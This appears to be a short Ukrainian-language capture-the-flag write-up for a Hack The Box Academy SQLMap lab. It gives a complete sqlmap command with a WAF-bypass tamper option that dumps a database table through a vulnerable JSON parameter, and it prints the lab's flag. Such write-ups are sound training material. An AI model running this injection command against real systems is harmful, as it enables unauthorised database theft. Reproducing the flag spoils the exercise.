# SQLMap Essentials — Skills Assessment (final_flag)

## Модуль
[SQLMap Essentials — Skills Assessment](https://academy.hackthebox.com/module/58)

## Вектор
POST `/action.php` з JSON body `{"id":1}` — вразливий параметр `id`

## Виявлення
- Відкрити Shop → додати товар у кошик → перехопити POST в DevTools/Burp
- Endpoint: `POST /action.php`, Content-Type: application/json

## Bypass
WAF фільтрує символ `>` → sqlmap виводить WARNING → `--tamper=between`

## Команда
```bash
sqlmap -u "http://TARGET/action.php" \
  --data='{"id":1}' \
  --method=POST \
  --headers="Content-Type: application/json" \
  --tamper=between \
  --batch \
  --dump -T final_flag \
  --threads=5 \
  --level=3 --risk=3
```

## Injection Type
Boolean-based blind / Time-based blind (залежно від instance)

## Flag
`HTB{n07_50_h4rd_r16h7?!}`

## Ключові параметри
| Параметр | Призначення |
|---|---|
| `--tamper=between` | Замінює `>/<` на `BETWEEN` для bypass WAF |
| `--data='{"id":1}'` | POST body з JSON payload |
| `--headers="Content-Type: application/json"` | Вказати тип контенту |
| `--level=3 --risk=3` | Глибший scan + OR-payloads |
